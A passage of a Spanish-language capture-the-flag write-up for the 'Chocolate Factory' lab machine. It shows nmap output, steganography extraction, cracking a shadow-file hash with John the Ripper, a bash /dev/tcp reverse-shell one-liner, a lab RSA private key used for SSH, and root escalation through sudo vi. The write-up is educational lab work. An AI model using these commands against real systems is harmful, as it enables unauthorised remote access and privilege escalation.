+|   GenericLines, NULL: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+123/tcp open  ntp?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+124/tcp open  ansatrader?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+125/tcp open  locus-map?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+</code></pre>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th style="text-align:center">Parámetro</th>
+<th>Función</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">-p</td>
+<td>Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior</td>
+</tr>
+<tr>
+<td style="text-align:center">-sC</td>
+<td>Para que realice scripts básicos de reconocimiento</td>
+</tr>
+<tr>
+<td style="text-align:center">-sV</td>
+<td>Proporciona la versión e información de los servicios que corren por los puertos</td>
+</tr>
+</tbody>
+</table></div>
+<h2 id="puerto-80">Puerto 80</h2>
+<p>Con el whatweb podemos ver más información de la web</p>
+<pre><code class="language-bash">❯ whatweb 10.10.250.47
+http://10.10.250.47 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.250.47], PasswordField[password]
+</code></pre>
+<p>Al entrar a la web hay un panel de login, e probado con admin:admin y las típicas credenciales pero nada.</p>
+<p>El wappalayzer no reporta nada interesante.</p>
+<p><img src="/p/resoluci%C3%B3n-chocolate-factory/images/login.png"
+	width="742"
+	height="639"
+	srcset="/p/resoluci%C3%B3n-chocolate-factory/images/login_hu55794d4730ab618d4be8c0191c88d201_267686_480x0_resize_box_3.png 480w, /p/resoluci%C3%B3n-chocolate-factory/images/login_hu55794d4730ab618d4be8c0191c88d201_267686_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="116"
+		data-flex-basis="278px"
+	
+></p>
+<h2 id="puerto-21">Puerto 21</h2>
+<p>El nmap reporto que se podía entrar al puerto 21 como anónimo (<code>ftp-anon: Anonymous FTP login allowed</code>)</p>
+<pre><code class="language-bash">❯ ftp 10.10.250.47
+Connected to 10.10.250.47.
+220 (vsFTPd 3.0.3)
+Name (10.10.250.47:d3b0): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; 
+</code></pre>
+<p>Dentro solo hay una foto <code>gum_room.jpg</code>, con <code>get gum_room.jpg</code> nos la podemos pasar a nuestra máquina, la foto es la siguiente:</p>
+<p><img src="/p/resoluci%C3%B3n-chocolate-factory/images/gum.png"
+	width="1543"
+	height="872"
+	srcset="/p/resoluci%C3%B3n-chocolate-factory/images/gum_hu6cf4d5dd282a715f610d0635eab1306f_1410051_480x0_resize_box_3.png 480w, /p/resoluci%C3%B3n-chocolate-factory/images/gum_hu6cf4d5dd282a715f610d0635eab1306f_1410051_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="176"
+		data-flex-basis="424px"
+	
+></p>
+<p>Para ver si hay algo oculto en la foto usamos steghide</p>
+<p>Steghide es un software de esteganografía de código abierto que permite ocultar un archivo secreto en un archivo de imagen o audio.</p>
+<p>No notarás ningún cambio en la imagen o el archivo de audio. Sin embargo, el archivo secreto estará dentro de la imagen original o el archivo de audio. Es un software de línea de comando.</p>
+<pre><code class="language-bash">#Si no tienes instalado el &quot;steghide&quot; lo puedes descargar con
+sudo apt install steghide
+</code></pre>
+<pre><code class="language-bash">❯ steghide extract -sf gum_room.jpg
+Anotar salvoconducto: 
+anot� los datos extra�dos e/&quot;b64.txt&quot;.
+</code></pre>
+<p>Ahora se a creado un archivo b64.txt que está encriptado con base64</p>
+<pre><code class="language-bash">cat b64.txt | base64 -d &gt; decode.txt
+</code></pre>
+<p>Ahora en el decode.txt ya está el contenido</p>
+<pre><code>...
+...
+charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
+</code></pre>
+<p>Esto parece ser el /etc/shadow</p>
+<p>El fichero /etc/shadow almacena las contraseñas de las cuentas de usuario. Se utiliza este fichero por seguridad. /etc/shadow es un archivo de texto que contiene información sobre las contraseñas de los usuarios del sistema. Es propiedad del usuario root y del grupo oculto</p>
+<p>Al final de todo se puede ver el usuario charlie, junto a un hash sha512 (se puede saber que tipo es porque empieza con $6$)</p>
+<p>Para romper el hash vamos a usar John the Ripper, que es una herramienta para recuperación de contraseñas. Originalmente desarrollado para el sistema operativo Unix</p>
+<pre><code>sudo apt install john
+echo &quot;hash&quot; &gt; myhash.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt mihash.hash
+john --show mihash.hash
+</code></pre>
+<h2 id="homephp">home.php</h2>
+<p>Esto nos devuelve el usuario charlie con la contraseña, al probarlos en la web, nos lleva a otra página.</p>
+<p><img src="/p/resoluci%C3%B3n-chocolate-factory/images/remote.png"
+	width="657"
+	height="360"
+	srcset="/p/resoluci%C3%B3n-chocolate-factory/images/remote_hud27725407893b15b7d96a74ea8ab70cd_217590_480x0_resize_box_3.png 480w, /p/resoluci%C3%B3n-chocolate-factory/images/remote_hud27725407893b15b7d96a74ea8ab70cd_217590_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="182"
+		data-flex-basis="438px"
+	
+></p>
+<p>Desde aquí se pueden ejecutar comandos a la máquina víctima.</p>
+<h2 id="reverse-shell">Reverse shell</h2>
+<p>Primero nos ponemos en escucha por el puerto 443</p>
+<pre><code class="language-bash">nc -nlvp 443
+</code></pre>
+<p>Intentamos crear una reverse shell mandando <code>bash -i &gt;&amp; /dev/tcp/10.10.10.10/443 0&gt;&amp;1</code>, pero no recibimos nada, probamos añadiendo (bash -c &ldquo;&rdquo;) de tal forma que quede así <code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.10.10/443 0&gt;&amp;1&quot;</code> Ahora ya si</p>
+<h2 id="tratamiento-de-la-tty">Tratamiento de la tty</h2>
+<p>Antes para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:</p>
+<pre><code class="language-bash">script /dev/null -c bash
+</code></pre>
+<p>ctrl + z</p>
+<pre><code class="language-bash">stty raw -echo; fg
+</code></pre>
+<pre><code class="language-bash">reset
+</code></pre>
+<pre><code class="language-bash">xterm
+</code></pre>
+<pre><code class="language-bash">export SHELL=bash
+</code></pre>
+<pre><code class="language-bash">export TERM=xterm
+</code></pre>
+<h2 id="escalada-a-charlie">Escalada a charlie</h2>
+<p>En el /home/charlie hay un user.txt, pero no tenemos acceso para leerlo. Hay un archivo llamado teleport ahí hay una RSA private key.</p>
+<p>Una llave RSA es una llave generada por el algoritmo RSA. Esta llave está compuesta por dos partes, una parte pública y otra parte privada.</p>
+<p>Desde nuestra máquina guardamos esa key en un archivo llamado id_rsa</p>
+<pre><code class="language-bash">❯ cat id_rsa
+───────┬──────────────────────────────────────────────────────────────────────────────────
+       │ File: id_rsa
+───────┼──────────────────────────────────────────────────────────────────────────────────
+   1   │ -----BEGIN RSA PRIVATE KEY-----
+   2   │ MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW
+   3   │ 1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb
+   4   │ L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj
+   5   │ B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY
+   6   │ fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE
+   7   │ RaObPlb0dRy3KoN79lt+dh+jSg/dM/TYYe5L4wIDAQABAoIBAD2TzjQDYyfgu4Ej
+   8   │ Di32Kx+Ea7qgMy5XebfQYquCpUjLhK+GSBt9knKoQb9OHgmCCgNG3+Klkzfdg3g9
+   9   │ zAUn1kxDxFx2d6ex2rJMqdSpGkrsx5HwlsaUOoWATpkkFJt3TcSNlITquQVDe4tF
+  10   │ w8JxvJpMs445CWxSXCwgaCxdZCiF33C0CtVw6zvOdF6MoOimVZf36UkXI2FmdZFl
+  11   │ kR7MGsagAwRn1moCvQ7lNpYcqDDNf6jKnx5Sk83R5bVAAjV6ktZ9uEN8NItM/ppZ
+  12   │ j4PM6/IIPw2jQ8WzUoi/JG7aXJnBE4bm53qo2B4oVu3PihZ7tKkLZq3Oclrrkbn2
+  13   │ EY0ndcECgYEA/29MMD3FEYcMCy+KQfEU2h9manqQmRMDDaBHkajq20KvGvnT1U/T
+  14   │ RcbPNBaQMoSj6YrVhvgy3xtEdEHHBJO5qnq8TsLaSovQZxDifaGTaLaWgswc0biF
+  15   │ uAKE2uKcpVCTSewbJyNewwTljhV9mMyn/piAtRlGXkzeyZ9/muZdtesCgYEA4idA
+  16   │ KuEj2FE7M+MM/+ZeiZvLjKSNbiYYUPuDcsoWYxQCp0q8HmtjyAQizKo6DlXIPCCQ
+  17   │ RZSvmU1T3nk9MoTgDjkNO1xxbF2N7ihnBkHjOffod+zkNQbvzIDa4Q2owpeHZL19
+  18   │ znQV98mrRaYDb5YsaEj0YoKfb8xhZJPyEb+v6+kCgYAZwE+vAVsvtCyrqARJN5PB
+  19   │ la7Oh0Kym+8P3Zu5fI0Iw8VBc/Q+KgkDnNJgzvGElkisD7oNHFKMmYQiMEtvE7GB
+  20   │ FVSMoCo/n67H5TTgM3zX7qhn0UoKfo7EiUR5iKUAKYpfxnTKUk+IW6ME2vfJgsBg
+  21   │ 82DuYPjuItPHAdRselLyNwKBgH77Rv5Ml9HYGoPR0vTEpwRhI/N+WaMlZLXj4zTK
+  22   │ 37MWAz9nqSTza31dRSTh1+NAq0OHjTpkeAx97L+YF5KMJToXMqTIDS+pgA3fRamv
+  23   │ ySQ9XJwpuSFFGdQb7co73ywT5QPdmgwYBlWxOKfMxVUcXybW/9FoQpmFipHsuBjb
+  24   │ Jq4xAoGBAIQnMPLpKqBk/ZV+HXmdJYSrf2MACWwL4pQO9bQUeta0rZA6iQwvLrkM
+  25   │ Qxg3lN2/1dnebKK5lEd2qFP1WLQUJqypo5TznXQ7tv0Uuw7o0cy5XNMFVwn/BqQm
+  26   │ G2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln
+  27   │ -----END RSA PRIVATE KEY-----
+───────┴──────────────────────────────────────────────────────────────────────────────────
+</code></pre>
+<p>Ahora nos podemos conectar por ssh como charlie</p>
+<pre><code class="language-bash">ssh -i id_rsa charlie@10.10.94.87
+</code></pre>
+<p>Ya somos charlie y podemos ver la flag de usuario</p>
+<h2 id="escalada-root">Escalada root</h2>
+<p>Con <code>sudo -l</code> podemos ver todos los comandos que charlie puede ejecutar. Ahí podemos ver que el /usr/bin/vi lo puede ejecutar con sudo sin proporcionar contraseña</p>
+<p>vi (Visual) es un programa que entra en la categoría de los editores de texto, pues a diferencia de un procesador de texto no ofrece herramientas para determinar visualmente cómo quedará el documento impreso. Por esto carece de opciones como centrado o justificación de párrafos, pero permite mover, copiar, eliminar o insertar caracteres con mucha versatilidad. Este tipo de programas es frecuentemente utilizado por programadores para escribir código.</p>
+<p>Ejecutar vi como root</p>
+<p><code>sudo vi</code></p>
+<p>ctrl + c</p>
+<p>Y por último escribir :shell en la linea de abajo</p>
+<p><code>:shell</code></p>
+<p><img src="/p/resoluci%C3%B3n-chocolate-factory/images/root.png"
+	width="887"
+	height="1000"
+	srcset="/p/resoluci%C3%B3n-chocolate-factory/images/root_hub0a3254ffb2d65b16ba2d1c32daea127_98997_480x0_resize_box_3.png 480w, /p/resoluci%C3%B3n-chocolate-factory/images/root_hub0a3254ffb2d65b16ba2d1c32daea127_98997_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="88"
+		data-flex-basis="212px"
+	
+></p>
+<p>¡Ya somos root!</p>
+<h2 id="rootpy-puertos-100---125">root.py (Puertos 100 - 125)</h2>
+<p>En el directorio /root  hay un archivo llamado root.py el cual al ejecutarlo <code>pyhton root.py</code> pide una key: Volviendo al nmap que encontró 25 puertos tcp en los cuales todos pone lo mismo:</p>
+<pre><code>&quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+</code></pre>
+<p>Menos uno, el 113, que pone:</p>
+<pre><code>http://localhost/key_rev_key &lt;- You will find the key here!!!
+</code></pre>
+<p>Cuando entramos al <code>http://10.10.94.87/key_rev_key</code> nos descarga un archivo llamado <code>key_rev_key</code>, al abrirlo nos pide un nombre, e probado con charlie, Mr.Wonka, root, admin, etc&hellip; pero nada.</p>
+<pre><code class="language-bash">chmod +x key_rev_key
+</code></pre>
+<pre><code class="language-bash">❯ ./key_rev_key
+Enter your name: charlie
+Bad name!
+</code></pre>
+<p>Al hacer un nano al archivo hay una línea que pone:</p>
+<pre><code>congratulations you have found the key:   ^@^@^@^@b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='^@`
+</code></pre>
+<p>¡Ya tenemos la key!</p>
+<p>También hay otra línea en la cual se puede ver el nombre correcto</p>
+<pre><code class="language-bash">Enter your name:  %s  laksdhfas  
+</code></pre>
+<pre><code>❯ ./key_rev_key
+Enter your name: laksdhfas
+
+ congratulations you have found the key:   b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
+ Keep its safe
+</code></pre>
+<h2 id="root-flag">Root flag</h2>
+<p>Ahora ya podemos ejecutar el <code>root.py</code> que está en <code>/root</code> y poner la key.</p>
+<p>¡Nos responde con la flag de root!</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/ctf/">CTF</a>
+        
+            <a href="/tags/f%C3%A1cil/">Fácil</a>
+        
+            <a href="/tags/linux/">Linux</a>
+        
+            <a href="/tags/archivos-ocultos/">Archivos ocultos</a>
+        
+            <a href="/tags/vi/">vi</a>
+        
+            <a href="/tags/hash-sha512/">hash sha512</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Contenidos relacionados</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/resoluci%C3%B3n-gallery/">
+        
+        
+            <div class="article-image">
+                <img src="/p/resoluci%C3%B3n-gallery/images/1.9cdf3669e2acf1e2b325f8d7c03bc858_hu74081d98836637a3a254577a6310e1ab_1919168_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Resolución Gallery"
+                        
+                        data-hash="md5-nN82aeKs8eKzJfjXwDvIWA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Resolución Gallery</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/resoluci%C3%B3n-ctf-mr.robot/">
+        
+        
+            <div class="article-image">
+                <img src="/p/resoluci%C3%B3n-ctf-mr.robot/images/1.6c74e5eac131228fdae2cbe1c551fd4f_hub8527424b32679a0bcc3a110c2f4945e_354448_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Resolución CTF Mr.Robot"
+                        
+                        data-hash="md5-bHTl6sExIo/a4svhxVH9Tw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Resolución CTF Mr.Robot</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/resoluci%C3%B3n-agent-t/">
+        
+        
+            <div class="article-image">
+                <img src="/p/resoluci%C3%B3n-agent-t/images/1.18faf70b1ffa54aa3aecc1174c6d9767_huf29766ebaf1cfce58d07e093ebeb54f2_381121_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Resolución Agent T"
+                        
+                        data-hash="md5-GPr3Cx/6VKo67MEXTG2XZw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Resolución Agent T</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/resoluci%C3%B3n-walkthrough-vulnversity/">
+        
+        
+            <div class="article-image">
+                <img src="/p/resoluci%C3%B3n-walkthrough-vulnversity/images/1.6d8dd25184c450b84269bbba10df64ea_hucee9ccf4868fd3f2cad3b857bd2e88b0_402407_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Resolución Walkthrough Vulnversity"
+                        
+                        data-hash="md5-bY3SUYTEULhCabu6EN9k6g==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Resolución Walkthrough Vulnversity</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/resoluci%C3%B3n-brooklyn-nine-nine/">
+        
+        
+            <div class="article-image">
+                <img src="/p/resoluci%C3%B3n-brooklyn-nine-nine/images/1.71d399d464577bd4375d995f79355b27_hu497414cf599898370e0688d21bfdaa35_422467_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Resolución Brooklyn Nine Nine"
+                        
+                        data-hash="md5-cdOZ1GRXe9Q3XZlfeTVbJw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Resolución Brooklyn Nine Nine</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "d3b0o" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2022 d3b0o
+    </section>
+    
+    <section class="powerby">
+        Creado con <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Tema <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.16.0">Stack</a></b> diseñado por <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
